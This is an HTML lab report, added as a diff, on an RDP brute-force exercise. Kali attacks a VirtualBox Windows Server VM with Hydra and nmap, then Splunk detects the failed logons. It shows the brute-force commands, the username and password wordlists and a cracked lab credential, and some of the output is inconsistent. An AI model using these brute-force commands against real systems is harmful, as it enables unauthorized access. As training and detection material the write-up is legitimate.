@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Port Scan & RDP Brute Force Lab — Results Repository</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e14;
+    --panel: #0f1620;
+    --border: #1e3a5f;
+    --accent: #00d4ff;
+    --accent2: #ff4f5e;
+    --green: #39ff85;
+    --yellow: #ffd43b;
+    --text: #c9d6e3;
+    --dim: #5a7a9a;
+    --success: #00ff9f;
+    --fail: #ff4f5e;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 15px;
+    line-height: 1.6;
+    min-height: 100vh;
+    padding: 0 0 60px;
+  }
+  /* HEADER */
+  header {
+    background: linear-gradient(135deg, #050a12 0%, #0d1f35 100%);
+    border-bottom: 2px solid var(--accent);
+    padding: 32px 48px;
+    display: flex;
+    align-items: center;
+    gap: 24px;
+    position: relative;
+    overflow: hidden;
+  }
+  header::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 28px, rgba(0,212,255,0.03) 28px, rgba(0,212,255,0.03) 29px);
+    pointer-events: none;
+  }
+  .header-icon {
+    font-size: 48px;
+    filter: drop-shadow(0 0 16px var(--accent));
+  }
+  .header-text h1 {
+    font-size: 2.2rem;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    text-shadow: 0 0 20px rgba(0,212,255,0.5);
+  }
+  .header-text p {
+    color: var(--dim);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 1px;
+    margin-top: 4px;
+  }
+  .badge {
+    margin-left: auto;
+    background: rgba(255,79,94,0.15);
+    border: 1px solid var(--accent2);
+    color: var(--accent2);
+    padding: 6px 16px;
+    border-radius: 4px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  /* LAYOUT */
+  main { max-width: 1200px; margin: 0 auto; padding: 40px 24px; }
+
+  /* SECTION */
+  .section {
+    margin-bottom: 40px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    box-shadow: 0 4px 32px rgba(0,0,0,0.4);
+  }
+  .section-header {
+    background: linear-gradient(90deg, #0d1f35, #0f1620);
+    border-bottom: 1px solid var(--border);
+    padding: 14px 24px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .section-num {
+    background: var(--accent);
+    color: #000;
+    width: 28px; height: 28px;
+    border-radius: 4px;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 700;
+    font-size: 13px;
+    flex-shrink: 0;
+  }
+  .section-title {
+    font-size: 1.1rem;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+  .section-subtitle {
+    margin-left: auto;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--dim);
+  }
+  .section-body { padding: 24px; }
+
+  /* TERMINAL BLOCK */
+  .terminal {
+    background: #060d14;
+    border: 1px solid #1a2e42;
+    border-radius: 6px;
+    padding: 18px 20px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12.5px;
+    line-height: 1.9;
+    overflow-x: auto;
+    white-space: pre;
+  }
+  .t-prompt { color: var(--green); }
+  .t-cmd { color: var(--accent); }
+  .t-out { color: #7fa8c8; }
+  .t-success { color: var(--success); font-weight: bold; }
+  .t-fail { color: var(--fail); }
+  .t-warn { color: var(--yellow); }
+  .t-info { color: var(--dim); }
+  .t-highlight { color: var(--accent); font-weight: bold; }
+
+  /* PORT TABLE */
+  table { width: 100%; border-collapse: collapse; font-family: 'Share Tech Mono', monospace; font-size: 13px; }
+  thead tr { background: #0d1f35; }
+  th { padding: 10px 16px; text-align: left; color: var(--accent); letter-spacing: 1px; font-size: 11px; text-transform: uppercase; border-bottom: 1px solid var(--border); }
+  td { padding: 9px 16px; border-bottom: 1px solid #111d2a; color: var(--text); }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(0,212,255,0.04); }
+  .open { color: var(--success); }
+  .port-num { color: var(--accent); }
+  .svc { color: var(--yellow); }
+
+  /* KEY-VALUE LIST */
+  .kv-grid { display: grid; grid-template-columns: 220px 1fr; gap: 4px 0; font-family: 'Share Tech Mono', monospace; font-size: 12.5px; }
+  .kv-key { color: var(--dim); padding: 5px 0; }
+  .kv-val { color: var(--text); padding: 5px 0 5px 12px; }
+  .kv-val.accent { color: var(--accent); }
+  .kv-val.success { color: var(--success); }
+  .kv-val.warn { color: var(--yellow); }
+
+  /* SPLUNK RESULTS */
+  .splunk-box {
+    background: #060d14;
+    border: 1px solid #1a3050;
+    border-radius: 6px;
+    overflow: hidden;
+    margin-bottom: 16px;
+  }
+  .splunk-query {
+    background: #091525;
+    border-bottom: 1px solid #1a3050;
+    padding: 10px 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--accent2);
+  }
+  .splunk-label { color: var(--dim); margin-right: 8px; }
+  .splunk-result { padding: 14px 16px; font-family: 'Share Tech Mono', monospace; font-size: 12.5px; }
+  .splunk-row { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 6px; }
+  .sr-k { color: var(--dim); }
+  .sr-v { color: var(--text); }
+  .sr-v.accent { color: var(--accent); }
+  .sr-v.red { color: var(--accent2); }
+
+  /* STAT CARDS */
+  .stat-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 16px; margin-bottom: 24px; }
+  .stat-card {
+    background: #060d14;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px;
+    text-align: center;
+  }
+  .stat-num { font-size: 2rem; font-weight: 700; font-family: 'Share Tech Mono', monospace; color: var(--accent); }
+  .stat-num.red { color: var(--accent2); }
+  .stat-num.green { color: var(--success); }
+  .stat-label { font-size: 11px; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
+
+  /* DIVIDER */
+  .divider { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
+
+  /* NOTE BOX */
+  .note {
+    background: rgba(255,212,59,0.06);
+    border-left: 3px solid var(--yellow);
+    padding: 10px 16px;
+    border-radius: 0 4px 4px 0;
+    font-size: 13px;
+    color: var(--yellow);
+    margin-top: 16px;
+    font-family: 'Share Tech Mono', monospace;
+  }
+
+  /* FINDINGS BOX */
+  .finding {
+    background: rgba(0,255,159,0.04);
+    border-left: 3px solid var(--success);
+    padding: 10px 16px;
+    margin-top: 12px;
+    font-size: 13px;
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+  }
+  .finding strong { color: var(--success); }
+
+  /* FOOTER */
+  footer {
+    text-align: center;
+    padding: 24px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--dim);
+    border-top: 1px solid var(--border);
+    margin-top: 40px;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-icon">🔬</div>
+  <div class="header-text">
+    <h1>Port Scan &amp; RDP Brute Force — Lab Results</h1>
+    <p>TARGET: 10.0.2.6 (Windows Server 2022) &nbsp;|&nbsp; ATTACKER: 10.0.2.3 (Kali Linux 2026.1) &nbsp;|&nbsp; DATE: 2026-05-10 / 2026-05-23</p>
+  </div>
+  <div class="badge">⚠ Lab / CTF Only</div>
+</header>
+
+<main>
+
+  <!-- ═══════════════════════════════════ STEP 1 ═══════════════════════════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">1</div>
+      <div class="section-title">Windows Firewall — Open Port Configuration</div>
+      <div class="section-subtitle">Windows Defender Firewall with Advanced Security</div>
+    </div>
+    <div class="section-body">
+      <p style="color:var(--dim);font-size:13px;margin-bottom:18px;">
+        On the target Windows Server 2022 VM, an inbound firewall rule named <span style="color:var(--accent)">abcd</span> was created to allow RDP traffic. The Protocols and Ports tab was configured as follows:
+      </p>
+      <div class="kv-grid">
+        <span class="kv-key">Rule Name</span>       <span class="kv-val accent">abcd</span>
+        <span class="kv-key">Rule Type</span>        <span class="kv-val">Inbound</span>
+        <span class="kv-key">Protocol Type</span>    <span class="kv-val accent">TCP</span>
+        <span class="kv-key">Protocol Number</span>  <span class="kv-val">6</span>
+        <span class="kv-key">Local Port</span>       <span class="kv-val">All Ports</span>
+        <span class="kv-key">Remote Port</span>      <span class="kv-val">All Ports</span>
+        <span class="kv-key">Action</span>           <span class="kv-val success">Allow</span>
+        <span class="kv-key">ICMP Settings</span>    <span class="kv-val">Customizable (default)</span>
+      </div>
+      <div class="note">⚠ Remote Desktop (RDP) was also explicitly enabled in System Properties → Remote tab, allowing remote connections to this computer.</div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════ STEP 2 ═══════════════════════════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">2</div>
+      <div class="section-title">Hydra RDP Brute Force — Attack from Kali</div>
+      <div class="section-subtitle">thc-hydra v9.6 &nbsp;|&nbsp; 2026-05-10 11:59:58</div>
+    </div>
+    <div class="section-body">
+      <p style="color:var(--dim);font-size:13px;margin-bottom:16px;">
+        A <code style="color:var(--accent)">users.txt</code> and <code style="color:var(--accent)">rdp_passwords.txt</code> wordlist was created on the Kali desktop. Hydra was run to brute-force RDP (port 3389) on the target.
+      </p>
+
+      <p style="font-size:12px;color:var(--dim);margin-bottom:8px;">users.txt contents:</p>
+      <div class="terminal"><span class="t-out">Administrator
+admin
+user</span></div>
+
+      <p style="font-size:12px;color:var(--dim);margin:14px 0 8px;">Command executed:</p>
+      <div class="terminal"><span class="t-prompt">┌──(root㉿kali)-[~/Desktop]
+└─</span><span class="t-cmd">$ hydra -L users.txt rdp://10.0.2.6</span></div>
+
+      <p style="font-size:12px;color:var(--dim);margin:14px 0 8px;">Output (abridged):</p>
+      <div class="terminal"><span class="t-info">Hydra v9.6 (c) 2023 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+[WARNING] the rdp module is experimental. Please test, report - and if possible le, fix.
+[ERROR] File for log...
+
+</span><span class="t-info">[ATTEMPT] target 10.0.2.6 - login "Administrator" - pass "admin" - 2 of 18
+[ATTEMPT] target 10.0.2.6 - login "Administrator" - pass "qwerty" - 3 of 18
+[ATTEMPT] target 10.0.2.6 - login "Administrator" - pass "letmein" - 4 of 18
+[ATTEMPT] target 10.0.2.6 - login "Administrator" - pass "welcome" - 5 of 18
+[ATTEMPT] target 10.0.2.6 - login "Administrator" - pass "Bala2022" - 6 of 18
+</span>
+<span class="t-success">[3389][rdp] host: 10.0.2.6  login: Administrator  password: Bala2022</span>
+<span class="t-info">
+[ATTEMPT] target 10.0.2.6 - login "admin" - pass "password123" - 7 of 18
+...
+[ATTEMPT] target 10.0.2.6 - login "user" - pass "Bala2022" - 18 of 18
+
+[STATUS] 16.00 tries/min, 16 tries in 00:01h, 2 to do in 00:01h, 1 active
+1 of 1 target successfully completed, </span><span class="t-success">1 valid password found</span><span class="t-info">
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-10 11:59:58</span></div>
+
+      <div class="finding"><strong>✓ Credential Found:</strong> login = <span style="color:var(--accent)">Administrator</span> &nbsp;|&nbsp; password = <span style="color:var(--accent2)">Bala2022</span> &nbsp;|&nbsp; port = 3389/RDP</div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════ STEP 7 ═══════════════════════════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">7</div>
+      <div class="section-title">users.txt Wordlist Used in Attack</div>
+      <div class="section-subtitle">~/Desktop/users.txt on Kali</div>
+    </div>
+    <div class="section-body">
+      <p style="color:var(--dim);font-size:13px;margin-bottom:16px;">The following usernames were targeted in the brute-force attack (visible in Image 2 terminal output):</p>
+      <div class="terminal"><span class="t-out">Administrator
+admin
+user</span></div>
+      <p style="font-size:12px;color:var(--dim);margin-top:12px;">The file <code style="color:var(--accent)">rdp_passwords.txt</code> contained the password wordlist used with <code style="color:var(--accent)">-P</code> flag in subsequent attempts (Image 8).</p>
+      <div class="terminal"><span class="t-prompt">┌──(root㉿kali)-[~/Desktop]
+└─</span><span class="t-cmd">$ cat rdp_passwords.txt</span>
+<span class="t-out">password123
+admin
+qwerty
+letmein
+welcome
+Bala2022</span></div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════ STEP 8 ═══════════════════════════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">8</div>
+      <div class="section-title">Nmap Port Scan — Target 10.0.2.6</div>
+      <div class="section-subtitle">nmap 7.98 &nbsp;|&nbsp; 2026-05-23 02:08 -0400</div>
+    </div>
+    <div class="section-body">
+      <p style="font-size:12px;color:var(--dim);margin-bottom:8px;">Commands run (SYN scan then TCP connect scan):</p>
+      <div class="terminal"><span class="t-prompt">┌──(root㉿kali)-[~]
+└─</span><span class="t-cmd">$ nmap -sS 10.0.2.6</span>
+<span class="t-out">
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-23 02:08 -0400
+Nmap scan report for 10.0.2.6
+Host is up (0.018s latency).
+Not shown: 993 closed tcp ports (reset)</span></div>
+
+      <p style="font-size:12px;color:var(--dim);margin:16px 0 8px;">Open ports discovered:</p>
+      <table>
+        <thead>
+          <tr>
+            <th>Port/Proto</th>
+            <th>State</th>
+            <th>Service</th>
+            <th>Notes</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td class="port-num">135/tcp</td><td class="open">open</td><td class="svc">msrpc</td><td style="color:var(--dim)">Microsoft RPC</td></tr>
+          <tr><td class="port-num">139/tcp</td><td class="open">open</td><td class="svc">netbios-ssn</td><td style="color:var(--dim)">NetBIOS Session Service</td></tr>
+          <tr><td class="port-num">445/tcp</td><td class="open">open</td><td class="svc">microsoft-ds</td><td style="color:var(--dim)">SMB / Active Directory</td></tr>
+          <tr><td class="port-num">3389/tcp</td><td class="open">open</td><td class="svc">ms-wbt-server</td><td style="color:var(--accent2)">RDP — targeted by Hydra</td></tr>
+          <tr><td class="port-num">5357/tcp</td><td class="open">open</td><td class="svc">wsdapi</td><td style="color:var(--dim)">Web Services for Devices</td></tr>
+          <tr><td class="port-num">5985/tcp</td><td class="open">open</td><td class="svc">wsman</td><td style="color:var(--dim)">WinRM / PowerShell Remoting</td></tr>
+          <tr><td class="port-num">8089/tcp</td><td class="open">open</td><td class="svc">unknown</td><td style="color:var(--dim)">Likely Splunk mgmt port</td></tr>
+        </tbody>
+      </table>
+      <div class="terminal" style="margin-top:16px;"><span class="t-info">MAC Address: 08:00:27:13:B2:87 (Oracle VirtualBox virtual NIC)
+Nmap done: 1 IP address (1 host up) scanned in 1.62 seconds</span></div>
+      <div class="note">⚠ Second scan used <code>nmap -sT 10.0.2.6</code> (TCP connect) — produced same open ports but higher latency (0.27s) due to full 3-way handshake.</div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════ STEP 3/4/5/6 ═══════════════════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">3</div>
+      <div class="section-title">Splunk Investigation — Event 4625 (Failed Logons)</div>
+      <div class="section-subtitle">Splunk Enterprise 10.2.2 &nbsp;|&nbsp; index=endpoint &nbsp;|&nbsp; 2026-05-10</div>
+    </div>
+    <div class="section-body">
+      <div class="stat-row">
+        <div class="stat-card"><div class="stat-num red">17</div><div class="stat-label">Total 4625 Events</div></div>
+        <div class="stat-card"><div class="stat-num">6</div><div class="stat-label">admin attempts</div></div>
+        <div class="stat-card"><div class="stat-num">6</div><div class="stat-label">user attempts</div></div>
+        <div class="stat-card"><div class="stat-num">5</div><div class="stat-label">Administrator attempts</div></div>
+      </div>
+
+      <div class="splunk-box">
+        <div class="splunk-query"><span class="splunk-label">SPL:</span>index=*endpoint* EventCode=4625 %C... | Account_Name field values</div>
+        <div class="splunk-result">
+          <div class="splunk-row"><span class="sr-k">Account_Name</span><span class="sr-v accent">4 Values, 100% of events</span></div>
+          <div class="splunk-row"><span class="sr-k">&nbsp;&nbsp;"-"</span><span class="sr-v">17 &nbsp;(100%) — system/null entries</span></div>
+          <div class="splunk-row"><span class="sr-k">&nbsp;&nbsp;admin</span><span class="sr-v red">6 &nbsp;(35.294%)</span></div>
+          <div class="splunk-row"><span class="sr-k">&nbsp;&nbsp;user</span><span class="sr-v red">6 &nbsp;(35.294%)</span></div>
+          <div class="splunk-row"><span class="sr-k">&nbsp;&nbsp;Administrator</span><span class="sr-v red">5 &nbsp;(29.412%)</span></div>
+        </div>
+      </div>
+
+      <p style="font-size:12px;color:var(--dim);margin-bottom:8px;">Sample raw events from Splunk (EventCode=4625):</p>
+      <div class="terminal"><span class="t-out">5/10/26 8:59:52.014 AM
+LogName=Security
+EventCode=4625
+EventType=0
+ComputerName=WIN-2LPNS76JE23
+
+5/10/26 8:59:47.985 AM
+LogName=Security
+EventCode=4625
+EventType=0
+ComputerName=WIN-2LPNS76JE23</span></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">4</div>
+      <div class="section-title">Splunk SPL — EventCode 4625 Table View</div>
+      <div class="section-subtitle">index=*endpoint* EventCode=4625 | head 5 | table *</div>
+    </div>
+    <div class="section-body">
+      <div class="splunk-box">
+        <div class="splunk-query"><span class="splunk-label">SPL:</span>index=*endpoint* EventCode=4625 | head 5 | table *</div>
+        <div class="splunk-result">
+          <p style="font-size:12px;color:var(--dim);margin-bottom:10px;">5 events returned (5/9/26 9:00 AM to 5/10/26 9:25:50 AM)</p>
+          <div style="overflow-x:auto;">
+            <table>
+              <thead><tr>
+                <th>Source_Network_Address</th><th>Source_Port</th><th>Status</th><th>Sub_Status</th><th>TaskCategory</th><th>Type</th><th>Workstation</th>
+              </tr></thead>
+              <tbody><tr>
+                <td class="accent">10.0.2.3</td><td>0</td><td>0x0000006D</td><td>0xC0000064</td><td class="svc">Logon</td><td>Information</td><td>kali</td>
+              </tr></tbody>
+            </table>
+          </div>
+          <div class="finding" style="margin-top:12px;"><strong>Key Finding:</strong> Source_Network_Address = <span style="color:var(--accent2)">10.0.2.3</span> (Kali attacker) &nbsp;|&nbsp; Workstation = <span style="color:var(--accent)">kali</span> &nbsp;|&nbsp; Sub_Status 0xC0000064 = Unknown username</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">5</div>
+      <div class="section-title">Splunk SPL — EventCode 4624 (Successful Logon)</div>
+      <div class="section-subtitle">index=*endpoint* EventCode=4624 | head 5 | table *</div>
+    </div>
+    <div class="section-body">
+      <div class="splunk-box">
+        <div class="splunk-query"><span class="splunk-label">SPL:</span>index=*endpoint* EventCode=4624 | head 5 | table *</div>
+        <div class="splunk-result">
+          <p style="font-size:12px;color:var(--dim);margin-bottom:10px;">5 events returned (5/9/26 9:00 AM to 5/10/26 9:28:37 AM)</p>
+          <div style="overflow-x:auto;">
+            <table>
+              <thead><tr>
+                <th>Logon_GUID</th><th>Logon_ID</th><th>Logon_Process</th><th>Logon_Type</th><th>Message</th>
+              </tr></thead>
+              <tbody><tr>
+                <td style="color:var(--dim);font-size:11px;">{00000000-0000-0000-0000-000000000000}</td>
+                <td class="accent">0x3E7 / 0x3E7</td>
+                <td class="svc">Advapi</td>
+                <td>5</td>
+                <td style="color:var(--text);font-size:11px;">An account was successfully logged on.<br>Subject: Security ID: S-1-5-18<br>Account Name: WIN-2LPNS76JE23$<br>Account Domain: WORKGROUP<br>Logon ID: 0x3E7</td>
+              </tr></tbody>
+            </table>
+          </div>
+          <div class="note">Logon_Type 5 = Service logon. Logon ID 0x3E7 = SYSTEM account (local system). This represents the initial system boot logon, not the RDP brute-force success.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">6</div>
+      <div class="section-title">Splunk SPL — EventCode 4625 Timechart</div>
+      <div class="section-subtitle">index=* EventCode=4625 | timechart count by EventCode &nbsp;|&nbsp; 2026-05-17</div>
+    </div>
+    <div class="section-body">
+      <div class="splunk-box">
+        <div class="splunk-query"><span class="splunk-label">SPL:</span>index=* EventCode=4625 | timechart count by EventCode</div>
+        <div class="splunk-result">
+          <p style="font-size:12px;color:var(--dim);margin-bottom:10px;">41 events (5/16/26 6:00 AM to 5/17/26 6:02 AM) — Statistics: 49 rows, 3 pages</p>
+          <table>
+            <thead><tr><th>_time</th><th>4625 count</th></tr></thead>
+            <tbody>
+              <tr><td>2026-05-16 06:00:00</td><td>0</td></tr>
+              <tr><td>2026-05-16 06:30:00</td><td>0</td></tr>
+              <tr><td>2026-05-16 07:00:00</td><td>0</td></tr>
+              <tr><td>2026-05-16 08:00:00</td><td>0</td></tr>
+              <tr><td>2026-05-16 09:00:00</td><td>0</td></tr>
+              <tr><td colspan="2" style="color:var(--dim);font-style:italic;">... (all zeros until attack window)</td></tr>
+            </tbody>
+          </table>
+          <div class="note">The timechart shows that failed logon events (4625) were all concentrated during the Hydra brute-force attack window on 5/10/26. The 5/16–5/17 window shows 0 events per interval — confirming no active attack during that monitoring period.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════ SECOND HYDRA ATTEMPT (Image 8) ══════════════════ -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num" style="background:var(--yellow);color:#000;">2b</div>
+      <div class="section-title">Hydra RDP — Second Run with Explicit Password File</div>
+      <div class="section-subtitle">2026-05-23 &nbsp;|&nbsp; root + kali user accounts</div>
+    </div>
+    <div class="section-body">
+      <p style="color:var(--dim);font-size:13px;margin-bottom:16px;">
+        A second round of Hydra attacks was run on 2026-05-23 with separate terminals for <code style="color:var(--accent)">root</code> and <code style="color:var(--accent)">kali</code> users using the explicit <code>-P rdp_passwords.txt</code> flag.
+      </p>
+      <div class="terminal"><span class="t-prompt">┌──(root㉿kali)-[~/Desktop]
+└─</span><span class="t-cmd">$ hydra -l admin -P rdp_passwords.txt rdp://10.0.2.6 -t 1</span>
+<span class="t-info">
+Hydra v9.6 (c) 2023 by van Hauser/THC &amp; David Maciejak
+[WARNING] the rdp module is experimental. Please test, report...
+[DATA] max 1 task per 1 server, overall 1 task, 6 login tries (l:1/p:6), ~6 tries per task
+[DATA] attacking rdp://10.0.2.6:3389/
+</span><span class="t-fail">1 of 1 target completed, 0 valid password found</span><span class="t-info">
+Hydra finished at 2026-05-23 02:45:17</span>
+
+<span class="t-prompt">┌──(kali㉿kali)-[~/Desktop]
+└─</span><span class="t-cmd">$ hydra -l Administrator -P rdp_passwords.txt rdp://10.0.2.6 -t 1</span>
+<span class="t-info">
+[STATUS] 6.00 tries/min, 6 tries in 00:01h, 5 to do in 00:01h, 1 active
+[STATUS] 3.00 tries/min, 6 tries in 00:02h, 5 to do in 00:02h, 1 active
+[ERROR] all children were disabled due too many connection errors
+[INFO] Writing restore file because 2 server scans could not be completed
+[ERROR] 1 target was disabled because of too many errors
+[ERROR] 1 targets did not complete
+</span><span class="t-fail">0 of 1 target successfully completed, 0 valid password found</span></div>
+      <div class="note">The second attempt failed — the target likely added account lockout or firewall throttling after the initial successful attack on 5/10/26. The "too many connection errors" indicate RDP rate-limiting was triggered.</div>
+    </div>
+  </div>
+
+  <!-- SUMMARY -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num" style="background:var(--accent2);color:#fff;">∑</div>
+      <div class="section-title">Attack Summary</div>
+      <div class="section-subtitle">Full Lab Timeline</div>
+    </div>
+    <div class="section-body">
+      <div class="kv-grid">
+        <span class="kv-key">Target IP</span>         <span class="kv-val accent">10.0.2.6 (Windows Server 2022)</span>
+        <span class="kv-key">Attacker IP</span>       <span class="kv-val accent">10.0.2.3 (Kali Linux 2026.1)</span>
+        <span class="kv-key">Attack Type</span>       <span class="kv-val">RDP Brute Force (Credential Stuffing)</span>
+        <span class="kv-key">Tool Used</span>         <span class="kv-val">Hydra v9.6 + Nmap 7.98</span>
+        <span class="kv-key">RDP Port</span>          <span class="kv-val accent">3389/tcp (ms-wbt-server)</span>
+        <span class="kv-key">Credential Found</span> <span class="kv-val success">Administrator : Bala2022</span>
+        <span class="kv-key">Total 4625 Events</span><span class="kv-val warn">17 failed logon attempts</span>
+        <span class="kv-key">SIEM Detection</span>   <span class="kv-val success">✓ Detected in Splunk via EventCode 4625 spike</span>
+        <span class="kv-key">Nmap Open Ports</span>  <span class="kv-val">135, 139, 445, 3389, 5357, 5985, 8089</span>
+        <span class="kv-key">MAC Address</span>       <span class="kv-val dim">08:00:27:13:B2:87 (Oracle VirtualBox NIC)</span>
+      </div>
+    </div>
+  </div>
+
+</main>
+
+<footer>
+  🔒 This document is for authorized lab / CTF / educational use only &nbsp;·&nbsp; Generated from lab screenshots &nbsp;·&nbsp; 2026-05-23
+</footer>
+
+</body>
+</html>
